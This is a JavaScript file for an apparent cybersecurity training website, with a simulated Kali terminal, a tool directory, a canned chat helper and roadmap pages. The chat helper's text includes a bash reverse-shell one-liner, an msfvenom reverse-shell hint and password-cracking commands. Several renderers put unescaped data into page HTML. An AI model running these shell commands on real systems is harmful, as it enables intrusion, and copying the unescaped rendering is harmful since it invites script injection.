// =============================================================================
// ROOTCRAFT — Main Application Logic (app.js)
// Vanilla JavaScript — No frameworks, no build step
// =============================================================================

(function () {
  'use strict';

  // ═══════════════════════════════════════════════════
  // Matrix Rain Animation
  // ═══════════════════════════════════════════════════
  const canvas = document.getElementById('matrix-canvas');
  if (canvas) {
    const ctx = canvas.getContext('2d');
    const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZアイウエオカキクケコ<>/:;{}=+*#@!';
    const fontSize = 14;
    let columns, drops;

    function resizeCanvas() {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
      columns = Math.floor(canvas.width / fontSize);
      drops = Array(columns).fill(1);
    }
    resizeCanvas();
    window.addEventListener('resize', resizeCanvas);

    setInterval(() => {
      ctx.fillStyle = 'rgba(3, 7, 18, 0.05)';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = '#00ff88';
      ctx.font = fontSize + 'px monospace';
      for (let i = 0; i < drops.length; i++) {
        ctx.fillText(chars.charAt(Math.floor(Math.random() * chars.length)), i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
      }
    }, 45);
  }

  // ═══════════════════════════════════════════════════
  // Visit counter (for admin dashboard)
  // ═══════════════════════════════════════════════════
  localStorage.setItem('site_visits', String((parseInt(localStorage.getItem('site_visits') || '0', 10) + 1)));

  // ═══════════════════════════════════════════════════
  // Toast Notification
  // ═══════════════════════════════════════════════════
  const toastEl = document.getElementById('toast');
  const toastMsg = document.getElementById('toast-message');

  function showToast(msg) {
    if (!toastEl || !toastMsg) return;
    toastMsg.textContent = msg;
    toastEl.classList.remove('translate-y-24', 'opacity-0');
    toastEl.classList.add('pointer-events-auto');
    clearTimeout(toastEl._timer);
    toastEl._timer = setTimeout(() => {
      toastEl.classList.add('translate-y-24', 'opacity-0');
      toastEl.classList.remove('pointer-events-auto');
    }, 2500);
  }

  function copyText(text) {
    navigator.clipboard.writeText(text).then(() => {
      showToast('Copied: ' + (text.length > 50 ? text.substring(0, 50) + '…' : text));
    });
  }

  // Make copyText available globally for inline onclick handlers in rendered HTML
  window.copyText = copyText;

  // ═══════════════════════════════════════════════════
  // Tab Navigation
  // ═══════════════════════════════════════════════════
  const views = {
    'tab-terminal': 'view-terminal',
    'tab-tools': 'view-tools',
    'tab-ai': 'view-ai',
    'tab-roadmap': 'view-roadmap',
    'tab-utilities': 'view-utilities',
    'tab-auth': 'view-auth'
  };

  const activeTabClass = 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40';
  const inactiveTabClass = 'text-slate-400 hover:text-emerald-300 hover:bg-emerald-500/10';

  function switchTab(tabKey) {
    // Hide all views
    Object.values(views).forEach(id => {
      const el = document.getElementById(id);
      if (el) el.classList.add('hidden');
    });
    // Show selected view
    const viewId = views[tabKey];
    if (viewId) {
      const el = document.getElementById(viewId);
      if (el) el.classList.remove('hidden');
    }

    // Update all tab buttons
    document.querySelectorAll('.tab-btn').forEach(btn => {
      const btnTab = btn.getAttribute('data-tab');
      // Remove all active styling
      btn.classList.remove('bg-emerald-500/20', 'text-emerald-300', 'border-emerald-500/40');
      btn.classList.add('text-slate-400');
      if (btnTab === tabKey) {
        btn.classList.add('bg-emerald-500/20', 'text-emerald-300');
        btn.classList.remove('text-slate-400');
      }
    });

    // Close mobile menu
    const mobileNav = document.getElementById('mobile-nav');
    if (mobileNav) mobileNav.classList.add('hidden');
  }

  // Attach tab click handlers
  document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const tabKey = btn.getAttribute('data-tab');
      if (tabKey) switchTab(tabKey);
    });
  });

  // Mobile menu toggle
  const mobileMenuBtn = document.getElementById('mobile-menu-btn');
  const mobileNav = document.getElementById('mobile-nav');
  if (mobileMenuBtn && mobileNav) {
    mobileMenuBtn.addEventListener('click', () => mobileNav.classList.toggle('hidden'));
  }

  // ═══════════════════════════════════════════════════
  // Terminal Sandbox
  // ═══════════════════════════════════════════════════
  const termOutput = document.getElementById('terminal-output');
  const termForm = document.getElementById('terminal-form');
  const termInput = document.getElementById('terminal-input');

  const terminalCommands = {
    help: `Available Commands:
  help          Display this help menu
  whoami        Show current session identity
  id            Print user and group IDs
  uname -a      System information
  ifconfig      Show network interfaces
  hostname      Display hostname
  pwd           Print working directory
  ls            List directory contents
  date          Display date/time
  uptime        Show system uptime
  neofetch      System info banner
  clear         Wipe terminal output

  ── Security Tools ──
  nmap          Network scanner
  sqlmap        SQL injection scanner
  gobuster      Directory discovery
  hydra         Password brute-forcer
  nikto         Web server scanner
  dirb          URL brute-forcer
  hashcat       Hash cracker
  john          John the Ripper
  msfconsole    Metasploit framework
  tcpdump       Packet capture
  aircrack-ng   Wireless cracking
  searchsploit  Exploit database search
  wpscan        WordPress scanner
  enum4linux    SMB enumeration
  whois         Domain registration info
  dig           DNS lookup
  ping          ICMP connectivity test
  curl          HTTP request
  netstat       Network statistics
  ss            Socket statistics`,

    whoami: 'kali (simulated sandbox user)',
    id: 'uid=1000(kali) gid=1000(kali) groups=1000(kali),27(sudo),44(video)',
    uname: 'Linux kali 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux',
    hostname: 'kali',
    pwd: '/home/kali',
    ls: 'Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos\nscripts  tools  wordlists  .bashrc  .ssh',
    uptime: () => new Date().toLocaleTimeString() + ' up 4 days, 12:05, 1 user, load average: 0.18, 0.12, 0.09',
    date: () => new Date().toString(),
    cat: 'cat: missing operand. Try: cat /etc/passwd',
    ifconfig: `eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.100  netmask 255.255.255.0  broadcast 10.10.10.255
        ether 08:00:27:a1:b2:c3  txqueuelen 1000
        RX packets 24851  TX packets 18412

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0`,
    neofetch: `        ..          kali@kali
       /yy-         OS: Kali GNU/Linux Rolling x86_64
      :NNNN.        Kernel: 6.6.9-amd64
     .dNNNNd        Uptime: 4 days, 12 hours
     :NNNNN:        Shell: bash 5.2.21
      dNNNNb        CPU: Intel i7-12700H (14) @ 4.7GHz
       YNNP         Memory: 2187MiB / 16384MiB`,
    nmap: (args) => `Starting Nmap 7.94 ( https://nmap.org ) at ${new Date().toLocaleTimeString()}
Nmap scan report for ${args || '10.10.10.1'}
Host is up (0.0024s latency).
PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 9.2p1
80/tcp   open  http      Apache httpd 2.4.57
443/tcp  open  ssl       OpenSSL 3.0.11
3306/tcp open  mysql     MySQL 8.0.35
8080/tcp open  http-proxy Squid 4.13
Nmap done: 1 IP address (1 host up) scanned in 2.31s`,
    sqlmap: () => `sqlmap/1.8.2#stable
[*] starting @ ${new Date().toLocaleTimeString()}
[*] testing connection to target URL
[+] target is UNION-injectable
[*] fetching database names
[+] available databases [3]:
    [*] information_schema
    [*] users_db
    [*] app_data`,
    gobuster: () => `Gobuster v3.6 — directory enumeration
[+] Url:     http://target.local
[+] Threads: 10
===============================================================
/admin    (Status: 301) [Size: 178]
/api      (Status: 200) [Size: 450]
/login    (Status: 200) [Size: 2450]
/uploads  (Status: 403) [Size: 278]
/robots.txt (Status: 200) [Size: 32]
===============================================================
Finished — 4614 requests in 3.2s`,
    hydra: () => `Hydra v9.5 — Network Logon Cracker
[DATA] attacking ssh://10.10.10.1:22/
[22][ssh] host: 10.10.10.1  login: admin  password: P@ssw0rd123!
1 of 1 target completed, 1 valid password found`,
    nikto: () => `- Nikto v2.5.0
+ Target: http://10.10.10.1
+ Server: Apache/2.4.57
+ /admin/: Directory indexing found.
+ X-Frame-Options header missing.
+ 5 item(s) reported on host`,
    dirb: () => `DIRB v2.22 — Web Content Scanner
URL_BASE: http://target.local/
GENERATED WORDS: 4614
+ http://target.local/admin (CODE:301|SIZE:178)
+ http://target.local/index.html (CODE:200|SIZE:4532)
DOWNLOADED: 4614 - FOUND: 2`,
    hashcat: 'hashcat (v6.2.6) benchmark:\nMD5:     1285.3 MH/s\nSHA-256:  421.7 MH/s\nbcrypt:    14.2 MH/s',
    john: 'Loaded 3 password hashes (sha512crypt)\nadmin:sunshine123   (admin)\njohn:password1     (john)\n2 password hashes cracked, 1 left',
    msfconsole: `       =[ metasploit v6.3.52-dev ]
+ -- --=[ 2391 exploits - 1235 auxiliary - 422 post ]
+ -- --=[ 1391 payloads - 46 encoders - 11 nops     ]
msf6 > [Simulated — type 'help' for sandbox commands]`,
    tcpdump: `tcpdump: listening on eth0
23:42:18 IP 10.10.10.100.43210 > 10.10.10.1.80: Flags [S]
23:42:18 IP 10.10.10.1.80 > 10.10.10.100.43210: Flags [S.]
23:42:18 IP 10.10.10.100.43210 > 10.10.10.1.80: Flags [.]
3 packets captured`,
    'aircrack-ng': `Aircrack-ng 1.7
[00:00:03] 12845/140000 keys tested (4281.67 k/s)
      KEY FOUND! [ password123 ]`,
    searchsploit: `searchsploit results:
 Apache 2.4.49 - Path Traversal       | 50383.sh
 Apache 2.4.50 - RCE (CVE-2021-42013) | 50406.sh
 Apache mod_proxy - SSRF               | 50446.py`,
    wpscan: `WPScan v3.8 — WordPress Security Scanner
[+] WordPress version 6.4.2 identified
[+] Theme: flavor
[+] Users: admin (id:1), editor (id:2)`,
    'enum4linux': `enum4linux v0.9.1
//10.10.10.1/IPC$   Mapping: OK
//10.10.10.1/backup Mapping: OK (readable)
S-1-5-21-...-500 Administrator
S-1-5-21-...-1000 svc_backup`,
    whois: (a) => `Domain: ${a || 'TARGET.COM'}\nRegistrar: GoDaddy.com\nCreated: 2020-01-15\nExpires: 2026-01-15`,
    dig: (a) => `; <<>> DiG 9.18 <<>> ${a || 'target.local'}\n;; ANSWER SECTION:\n${a || 'target.local'}.  300  IN  A  10.10.10.1`,
    ping: (a) => `PING ${a || 'target.local'} (10.10.10.1)\n64 bytes: icmp_seq=1 ttl=64 time=0.84 ms\n64 bytes: icmp_seq=2 ttl=64 time=0.65 ms\n3 packets, 0% loss`,
    curl: 'HTTP/1.1 200 OK\nServer: Apache/2.4.57\nContent-Type: text/html\n\n<!DOCTYPE html>...',
    wget: 'wget: specify URL to download',
    netstat: `Proto Local Address       Foreign Address     State
tcp   0.0.0.0:22          0.0.0.0:*           LISTEN
tcp   0.0.0.0:80          0.0.0.0:*           LISTEN
tcp   10.10.10.100:22     10.10.10.2:51234    ESTABLISHED`,
    ss: `State  Local Address:Port  Peer Address:Port
LISTEN 0.0.0.0:22         0.0.0.0:*
LISTEN 0.0.0.0:80         0.0.0.0:*
ESTAB  10.10.10.100:22    10.10.10.2:51234`
  };

  function printTerm(text, isInput) {
    if (!termOutput) return;
    const p = document.createElement('p');
    p.className = isInput ? 'text-emerald-400 font-semibold' : 'text-slate-300 whitespace-pre-wrap';
    p.textContent = text;
    termOutput.appendChild(p);
    termOutput.scrollTop = termOutput.scrollHeight;
  }

  function executeCommand(raw) {
    if (!raw) return;
    printTerm('kali@kali:~# ' + raw, true);
    const parts = raw.split(' ');
    const bin = parts[0].toLowerCase();
    const args = parts.slice(1).join(' ');

    if (bin === 'clear') { termOutput.innerHTML = ''; return; }

    const handler = terminalCommands[bin];
    if (handler) {
      setTimeout(() => printTerm(typeof handler === 'function' ? handler(args) : handler), 120);
    } else {
      printTerm(`bash: ${bin}: command not found. Type 'help' for available commands.`);
    }
  }

  if (termForm && termInput) {
    termForm.addEventListener('submit', e => {
      e.preventDefault();
      executeCommand(termInput.value.trim());
      termInput.value = '';
    });
  }

  // Quick command buttons
  document.querySelectorAll('.quick-cmd').forEach(btn => {
    btn.addEventListener('click', () => executeCommand(btn.getAttribute('data-cmd')));
  });

  // ═══════════════════════════════════════════════════
  // Tools Directory
  // ═══════════════════════════════════════════════════
  let currentCat = 'all';
  const toolsGrid = document.getElementById('tools-grid');
  const toolsSearch = document.getElementById('tools-search');

  function escapeHtml(s) {
    const d = document.createElement('div');
    d.appendChild(document.createTextNode(s));
    return d.innerHTML;
  }

  function renderTools() {
    if (!toolsGrid || typeof TOOLS === 'undefined') return;
    const q = (toolsSearch ? toolsSearch.value : '').toLowerCase();

    // Merge custom tools from admin panel
    let all = [...TOOLS];
    try {
      const custom = JSON.parse(localStorage.getItem('custom_tools') || '[]');
      all = all.concat(custom);
    } catch (e) { /* ignore */ }

    const filtered = all.filter(t => {
      const catMatch = currentCat === 'all' || t.catSlug === currentCat;
      const qMatch = !q || t.name.toLowerCase().includes(q) || t.desc.toLowerCase().includes(q);
      return catMatch && qMatch;
    });

    if (!filtered.length) {
      toolsGrid.innerHTML = `<div class="col-span-2 text-center py-16"><i class="fa-solid fa-ghost text-4xl text-slate-700 mb-3 block"></i><p class="text-slate-500 font-mono text-sm">No tools match your search</p></div>`;
      return;
    }

    toolsGrid.innerHTML = filtered.map(t => `
      <div class="p-5 rounded-xl border border-slate-800 bg-slate-900/40 space-y-3 hover:border-emerald-500/30 transition-all">
        <div class="flex items-center justify-between">
          <div class="flex items-center gap-2">
            <i class="fa-solid ${t.icon || 'fa-wrench'} text-emerald-400"></i>
            <span class="font-mono font-bold text-emerald-400">${escapeHtml(t.name)}</span>
          </div>
          <span class="text-[10px] font-mono px-2 py-0.5 rounded-full bg-emerald-500/10 text-emerald-300 border border-emerald-500/20">${escapeHtml(t.cat)}</span>
        </div>
        <p class="text-xs text-slate-400">${escapeHtml(t.desc)}</p>
        <div class="space-y-2">
          ${t.cmds.map(c => `
            <div class="p-2.5 rounded-lg bg-black/40 border border-slate-800 flex items-center justify-between gap-2 group hover:border-emerald-500/20 transition-all">
              <div class="min-w-0">
                <code class="text-xs font-mono text-emerald-300 break-all">${escapeHtml(c.cmd)}</code>
                <p class="text-[10px] text-slate-500 mt-0.5">${escapeHtml(c.desc)}</p>
              </div>
              <button onclick="copyText(\`${c.cmd.replace(/`/g, '\\`').replace(/\\/g, '\\\\')}\`)" class="text-slate-600 hover:text-emerald-400 p-1 shrink-0 opacity-0 group-hover:opacity-100 transition-opacity" title="Copy"><i class="fa-regular fa-copy"></i></button>
            </div>
          `).join('')}
        </div>
      </div>
    `).join('');
  }

  // Category filter buttons
  document.querySelectorAll('.filter-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      currentCat = btn.getAttribute('data-category');
      document.querySelectorAll('.filter-btn').forEach(b => {
        b.className = 'filter-btn text-xs font-mono px-3 py-1.5 rounded-full transition-all bg-slate-800 text-slate-400 border border-slate-700 hover:text-emerald-300 hover:border-emerald-500/40';
      });
      btn.className = 'filter-btn active-filter text-xs font-mono px-3 py-1.5 rounded-full transition-all bg-emerald-500/20 text-emerald-300 border border-emerald-500/40';
      renderTools();
    });
  });

  if (toolsSearch) toolsSearch.addEventListener('input', renderTools);

  // ═══════════════════════════════════════════════════
  // AI Chat Assistant
  // ═══════════════════════════════════════════════════
  const aiForm = document.getElementById('ai-chat-form');
  const aiInput = document.getElementById('ai-chat-input');
  const aiHistory = document.getElementById('ai-chat-history');
  const aiQuota = document.getElementById('ai-quota-count');
  let quotaLeft = 10;

  const aiKB = {
    nmap: "**Nmap** — Network Mapper\n\n• Basic scan: `nmap -sV -sC -T4 <target>`\n• All ports: `nmap -p- --min-rate 1000 <target>`\n• OS detection: `nmap -O <target>`\n• Vuln scripts: `nmap --script vuln <target>`\n\nAlways get written authorization before scanning.",
    sqlmap: "**SQL Injection** testing with sqlmap:\n\n• Auto-detect: `sqlmap -u '<url>?id=1' --batch --dbs`\n• From request: `sqlmap -r request.txt --dump`\n\n**Fix**: Use parameterized queries. Never concatenate user input.",
    xss: "**XSS** (Cross-Site Scripting):\n\n• **Reflected**: Payload in URL\n• **Stored**: Saved in DB\n• **DOM**: Manipulates DOM\n\n**Fix**: Output encoding, CSP headers, input validation.",
    burp: "**Burp Suite** — Web testing toolkit:\n\n• Proxy: Intercept HTTP/S\n• Repeater: Manual requests\n• Intruder: Automated fuzzing\n• Scanner: Vuln detection\n\nLearn free at PortSwigger Web Security Academy.",
    metasploit: "**Metasploit Framework**:\n\n• `msfconsole -q` — Launch\n• `search apache` — Find exploits\n• `use exploit/multi/handler` — Listener\n• `msfvenom -p linux/x64/shell_reverse_tcp ...` — Payloads",
    hash: "**Password Cracking**:\n\n• John: `john --wordlist=rockyou.txt hashes.txt`\n• Hashcat (GPU): `hashcat -m 0 hashes.txt rockyou.txt`\n• Hash modes: MD5=0, SHA1=100, SHA256=1400, bcrypt=3200\n\n**Defense**: Use Argon2id or bcrypt.",
    owasp: "**OWASP Top 10 (2021)**:\n\n1. Broken Access Control\n2. Cryptographic Failures\n3. Injection\n4. Insecure Design\n5. Security Misconfiguration\n6. Vulnerable Components\n7. Auth & Session Failures\n8. Software Integrity\n9. Logging Failures\n10. SSRF",
    privilege: "**Privilege Escalation**:\n\n**Linux**: SUID (`find / -perm -4000`), sudo -l, cron, kernel exploits\n• GTFOBins: https://gtfobins.github.io\n\n**Windows**: Token impersonation, unquoted service paths\n• LOLBAS: https://lolbas-project.github.io",
    reverse: "**Reverse Shell**:\n\n• Bash: `bash -i >& /dev/tcp/IP/4444 0>&1`\n• Listener: `nc -lvnp 4444`\n• Upgrade: `python3 -c 'import pty;pty.spawn(\"/bin/bash\")'`",
    wireshark: "**Wireshark / tshark**:\n\n• Capture: `tshark -i eth0 -f 'tcp port 80' -w cap.pcap`\n• Filter: `http.request.method == \"POST\"`\n• Passwords: `http.authbasic`",
    recon: "**Reconnaissance**:\n\n**Passive**: WHOIS, DNS, Google dorking, Shodan\n**Active**: Nmap, subdomain enum (amass), web crawling\n\nAlways start passive before active."
  };

  function addAiMessage(html, isUser) {
    if (!aiHistory) return;
    if (isUser) {
      aiHistory.innerHTML += `<div class="flex gap-3 justify-end"><div class="bg-emerald-500/10 border border-emerald-500/20 rounded-xl rounded-tr-sm px-4 py-3 max-w-[80%]"><p class="text-sm text-slate-200">${html}</p></div></div>`;
    } else {
      aiHistory.innerHTML += `<div class="flex gap-3"><div class="shrink-0 w-8 h-8 rounded-full bg-emerald-500/20 flex items-center justify-center"><i class="fa-solid fa-robot text-emerald-400 text-sm"></i></div><div class="bg-slate-800/60 rounded-xl rounded-tl-sm px-4 py-3 max-w-[85%]"><div class="text-sm text-slate-300 leading-relaxed">${html}</div></div></div>`;
    }
    aiHistory.scrollTop = aiHistory.scrollHeight;
  }

  function formatAi(text) {
    return text
      .replace(/\*\*(.*?)\*\*/g, '<strong class="text-emerald-300">$1</strong>')
      .replace(/`([^`]+)`/g, '<code class="px-1 py-0.5 rounded bg-black/60 text-emerald-300 text-xs font-mono">$1</code>')
      .replace(/\n/g, '<br>');
  }

  if (aiForm && aiInput) {
    aiForm.addEventListener('submit', e => {
      e.preventDefault();
      const val = aiInput.value.trim();
      if (!val) return;
      addAiMessage(escapeHtml(val), true);
      aiInput.value = '';

      const lower = val.toLowerCase();
      let answer = "I can help with cybersecurity topics! Ask about tools (nmap, sqlmap, burp), attacks (XSS, SQLi, privesc), or defense. What interests you?";

      for (const [key, resp] of Object.entries(aiKB)) {
        if (lower.includes(key)) { answer = resp; break; }
      }
      if (lower.includes('password') || lower.includes('crack')) answer = aiKB.hash;
      if (lower.includes('escalat') || lower.includes('privesc')) answer = aiKB.privilege;
      if (lower.includes('shell') && lower.includes('reverse')) answer = aiKB.reverse;
      if (lower.includes('top 10') || lower.includes('top10')) answer = aiKB.owasp;
      if (lower.includes('osint') || lower.includes('reconnaissance')) answer = aiKB.recon;

      // Typing indicator
      const tid = 'typing-' + Date.now();
      aiHistory.innerHTML += `<div id="${tid}" class="flex gap-3"><div class="shrink-0 w-8 h-8 rounded-full bg-emerald-500/20 flex items-center justify-center"><i class="fa-solid fa-robot text-emerald-400 text-sm"></i></div><div class="bg-slate-800/60 rounded-xl rounded-tl-sm px-4 py-3"><span class="inline-flex gap-1"><span class="w-2 h-2 rounded-full bg-emerald-400 animate-bounce"></span><span class="w-2 h-2 rounded-full bg-emerald-400 animate-bounce" style="animation-delay:.15s"></span><span class="w-2 h-2 rounded-full bg-emerald-400 animate-bounce" style="animation-delay:.3s"></span></span></div></div>`;
      aiHistory.scrollTop = aiHistory.scrollHeight;

      setTimeout(() => {
        const t = document.getElementById(tid);
        if (t) t.remove();
        addAiMessage(formatAi(answer), false);
        quotaLeft = Math.max(0, quotaLeft - 1);
        if (aiQuota) aiQuota.textContent = quotaLeft;
      }, 700);
    });
  }

  // ═══════════════════════════════════════════════════
  // Roadmap
  // ═══════════════════════════════════════════════════
  const trackGrid = document.getElementById('track-grid');
  const trackDetail = document.getElementById('track-detail');
  const trackInfo = document.getElementById('track-info');
  const trackPhases = document.getElementById('track-phases');
  const trackBackBtn = document.getElementById('track-back-btn');

  function renderRoadmapGrid() {
    if (!trackGrid || typeof ROADMAP === 'undefined') return;
    let hidden = [];
    try { hidden = JSON.parse(localStorage.getItem('hidden_tracks') || '[]'); } catch (e) {}
    const visible = ROADMAP.filter(t => !hidden.includes(t.id));

    trackGrid.innerHTML = visible.map(t => `
      <button data-track="${t.id}" class="track-card p-5 rounded-xl border border-slate-800 bg-slate-900/40 hover:border-emerald-500/30 transition-all text-left space-y-3 group">
        <div class="flex items-center gap-3">
          <div class="w-10 h-10 rounded-lg flex items-center justify-center shrink-0" style="background:${t.color}15;border:1px solid ${t.color}40;color:${t.color}"><i class="fa-solid ${t.icon}"></i></div>
          <div>
            <h3 class="font-mono font-bold text-sm text-slate-100 group-hover:text-emerald-300 transition-colors">${t.title}</h3>
            <span class="text-[10px] font-mono px-2 py-0.5 rounded-full" style="background:${t.color}15;color:${t.color}">${t.difficulty}</span>
          </div>
        </div>
        <p class="text-xs text-slate-400 line-clamp-2">${t.description}</p>
        <div class="text-[10px] font-mono text-slate-500">${t.phases.length} phases • ${t.certifications.length} certs</div>
      </button>
    `).join('');

    // Attach click handlers
    trackGrid.querySelectorAll('.track-card').forEach(card => {
      card.addEventListener('click', () => showTrackDetail(card.getAttribute('data-track')));
    });
  }

  function showTrackDetail(trackId) {
    if (typeof ROADMAP === 'undefined') return;
    const track = ROADMAP.find(t => t.id === trackId);
    if (!track || !trackGrid || !trackDetail || !trackInfo || !trackPhases) return;

    trackGrid.classList.add('hidden');
    trackDetail.classList.remove('hidden');

    trackInfo.innerHTML = `
      <div class="p-6 rounded-xl border border-slate-800 bg-slate-900/40 space-y-4">
        <div class="flex items-center gap-4">
          <div class="w-14 h-14 rounded-xl flex items-center justify-center text-xl" style="background:${track.color}15;border:1px solid ${track.color}40;color:${track.color}"><i class="fa-solid ${track.icon}"></i></div>
          <div>
            <h2 class="text-2xl font-bold font-mono" style="color:${track.color}">${track.title}</h2>
            <span class="text-xs font-mono px-2 py-0.5 rounded-full" style="background:${track.color}15;color:${track.color}">${track.difficulty}</span>
          </div>
        </div>
        <p class="text-sm text-slate-300">${track.description}</p>
        <div class="grid grid-cols-1 md:grid-cols-2 gap-4 pt-2">
          <div><h4 class="text-xs font-mono font-bold text-slate-500 uppercase mb-2">Prerequisites</h4><div class="flex flex-wrap gap-1.5">${track.prerequisites.map(p => `<span class="px-2 py-1 rounded-lg bg-slate-800 text-xs text-slate-300">${p}</span>`).join('')}</div></div>
          <div><h4 class="text-xs font-mono font-bold text-slate-500 uppercase mb-2">Certifications</h4><div class="flex flex-wrap gap-1.5">${track.certifications.map(c => `<span class="px-2 py-1 rounded-lg bg-emerald-500/10 border border-emerald-500/20 text-xs text-emerald-300">${c}</span>`).join('')}</div></div>
        </div>
      </div>`;

    trackPhases.innerHTML = track.phases.map((phase, i) => `
      <div class="rounded-xl border border-slate-800 bg-slate-900/50 overflow-hidden">
        <button class="phase-toggle w-full flex items-center gap-3 p-4 text-left hover:bg-slate-800/30 transition-colors">
          <span class="w-8 h-8 rounded-lg flex items-center justify-center font-mono text-xs font-bold shrink-0" style="background:${track.color}15;border:1px solid ${track.color}30;color:${track.color}">${i + 1}</span>
          <span class="font-mono font-bold text-sm text-slate-100 flex-1">${phase.name}</span>
          <i class="fa-solid fa-chevron-down text-slate-500 transition-transform phase-arrow"></i>
        </button>
        <div class="accordion-content">
          <div class="px-4 pb-4 space-y-4">
            <div>
              <h5 class="text-xs font-mono font-bold text-slate-500 uppercase mb-2">Topics</h5>
              <div class="grid grid-cols-1 md:grid-cols-2 gap-1">${phase.topics.map(t => `<div class="flex items-start gap-2 text-xs"><i class="fa-solid fa-circle-check text-emerald-500/50 text-[10px] mt-0.5"></i><span class="text-slate-300">${t}</span></div>`).join('')}</div>
            </div>
            <div>
              <h5 class="text-xs font-mono font-bold text-slate-500 uppercase mb-2">Tools</h5>
              <div class="flex flex-wrap gap-1.5">${phase.tools.map(t => `<span class="px-2 py-1 rounded-lg bg-black/40 border border-slate-800 text-xs font-mono text-emerald-300">${t}</span>`).join('')}</div>
            </div>
            <div>
              <h5 class="text-xs font-mono font-bold text-slate-500 uppercase mb-2">Resources</h5>
              <div class="space-y-1">${phase.resources.map(r => `<a href="${r.url}" target="_blank" rel="noopener" class="flex items-center gap-2 p-2 rounded-lg hover:bg-slate-800/50 transition-colors group"><i class="fa-solid fa-arrow-up-right-from-square text-[10px] text-slate-500 group-hover:text-emerald-400"></i><span class="text-xs text-slate-300 group-hover:text-emerald-300">${r.name}</span>${r.free ? '<span class="ml-auto text-[9px] font-mono px-1.5 py-0.5 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">FREE</span>' : ''}</a>`).join('')}</div>
            </div>
          </div>
        </div>
      </div>
    `).join('');

    // Phase accordion handlers
    trackPhases.querySelectorAll('.phase-toggle').forEach(btn => {
      btn.addEventListener('click', () => {
        const content = btn.nextElementSibling;
        const arrow = btn.querySelector('.phase-arrow');
        const isOpen = content.classList.contains('open');
        // Close all
        trackPhases.querySelectorAll('.accordion-content').forEach(el => el.classList.remove('open'));
        trackPhases.querySelectorAll('.phase-arrow').forEach(el => el.style.transform = '');
        if (!isOpen) {
          content.classList.add('open');
          arrow.style.transform = 'rotate(180deg)';
        }
      });
    });
  }

  if (trackBackBtn) {
    trackBackBtn.addEventListener('click', () => {
      if (trackGrid) trackGrid.classList.remove('hidden');
      if (trackDetail) trackDetail.classList.add('hidden');
    });
  }

  // ═══════════════════════════════════════════════════
  // Utilities
  // ═══════════════════════════════════════════════════

  // Base64
  const b64Input = document.getElementById('base64-input');
  const b64Output = document.getElementById('base64-output');
  const b64EncBtn = document.getElementById('base64-encode-btn');
  const b64DecBtn = document.getElementById('base64-decode-btn');

  if (b64EncBtn) b64EncBtn.addEventListener('click', () => {
    try { b64Output.textContent = btoa(b64Input.value); b64Output.className = 'mt-3 p-3 rounded-lg bg-black/40 text-xs font-mono text-emerald-400 min-h-[2.5rem] break-all'; }
    catch (e) { b64Output.textContent = 'Error: Invalid input'; b64Output.className = 'mt-3 p-3 rounded-lg bg-black/40 text-xs font-mono text-red-400 min-h-[2.5rem]'; }
  });
  if (b64DecBtn) b64DecBtn.addEventListener('click', () => {
    try { b64Output.textContent = atob(b64Input.value); b64Output.className = 'mt-3 p-3 rounded-lg bg-black/40 text-xs font-mono text-emerald-400 min-h-[2.5rem] break-all'; }
    catch (e) { b64Output.textContent = 'Error: Invalid Base64'; b64Output.className = 'mt-3 p-3 rounded-lg bg-black/40 text-xs font-mono text-red-400 min-h-[2.5rem]'; }
  });

  // Hash Identifier
  const hashInput = document.getElementById('hash-input');
  const hashOutput = document.getElementById('hash-output');
  const hashBtn = document.getElementById('hash-analyze-btn');
  if (hashBtn) hashBtn.addEventListener('click', () => {
    const h = (hashInput.value || '').trim();
    if (!h) { hashOutput.textContent = 'Paste a hash above to identify…'; return; }
    const r = [];
    if (/^[a-f0-9]+$/i.test(h)) {
      if (h.length === 32) r.push('MD5', 'NTLM', 'MD4');
      if (h.length === 40) r.push('SHA-1', 'RIPEMD-160');
      if (h.length === 64) r.push('SHA-256', 'GOST');
      if (h.length === 96) r.push('SHA-384');
      if (h.length === 128) r.push('SHA-512', 'Whirlpool');
    }
    if (h.startsWith('$2a$') || h.startsWith('$2b$') || h.startsWith('$2y$')) r.push('bcrypt');
    if (h.startsWith('$6$')) r.push('SHA-512 crypt');
    if (h.startsWith('$5$')) r.push('SHA-256 crypt');
    if (h.startsWith('$1$')) r.push('MD5 crypt');
    if (h.startsWith('$argon2')) r.push('Argon2');
    hashOutput.textContent = r.length ? 'Possible: ' + r.join(', ') + ' (' + h.length + ' chars)' : 'Unknown format (' + h.length + ' chars)';
  });

  // URL Encode/Decode
  const urlInput = document.getElementById('url-input');
  const urlOutput = document.getElementById('url-output');
  const urlEncBtn = document.getElementById('url-encode-btn');
  const urlDecBtn = document.getElementById('url-decode-btn');
  if (urlEncBtn) urlEncBtn.addEventListener('click', () => {
    try { urlOutput.textContent = encodeURIComponent(urlInput.value); } catch (e) { urlOutput.textContent = 'Error'; }
  });
  if (urlDecBtn) urlDecBtn.addEventListener('click', () => {
    try { urlOutput.textContent = decodeURIComponent(urlInput.value); } catch (e) { urlOutput.textContent = 'Error'; }
  });

  // Password Generator
  const pwLength = document.getElementById('pw-length');
  const pwLengthDisplay = document.getElementById('pw-length-display');
  const pwGenBtn = document.getElementById('pw-generate-btn');
  const pwOutput = document.getElementById('pw-output');
  const pwCopyBtn = document.getElementById('pw-copy-btn');

  if (pwLength && pwLengthDisplay) {
    pwLength.addEventListener('input', () => { pwLengthDisplay.textContent = pwLength.value; });
  }
  if (pwGenBtn) pwGenBtn.addEventListener('click', () => {
    const len = parseInt(pwLength.value) || 16;
    let charset = '';
    if (document.getElementById('pw-upper').checked) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
